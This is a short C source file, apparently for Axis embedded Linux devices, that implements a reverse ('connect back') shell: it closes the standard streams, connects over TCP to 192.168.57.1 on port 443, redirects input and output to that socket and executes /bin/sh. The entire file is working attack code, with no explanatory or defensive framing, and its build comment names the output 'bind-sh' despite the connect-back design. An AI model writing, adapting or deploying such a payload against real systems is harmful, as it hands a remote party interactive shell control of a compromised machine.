#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
/*
 * C code for connect back shell
 * Author: mcw / 2016-02
 *
 * crisv32-axis-linux-gnu-gcc -Wall -finline-functions -fno-common \
 * -fomit-frame-pointer -static -o bind-sh bind-sh.c
 */
 
  
int main(void)
{

        close(0);
        close(1);
        close(2);
	
	struct sockaddr_in srv_addr;
 	srv_addr.sin_family = AF_INET;
	srv_addr.sin_port = 0xbb01; // 443
	srv_addr.sin_addr.s_addr = 0x0139a8c0; // 0xc0a83901; 192.168.57.1
 
	int sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
	
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
 
        char *argv[] = {"//bin/sh",NULL,NULL};
	execve(argv[0], argv, NULL);

}
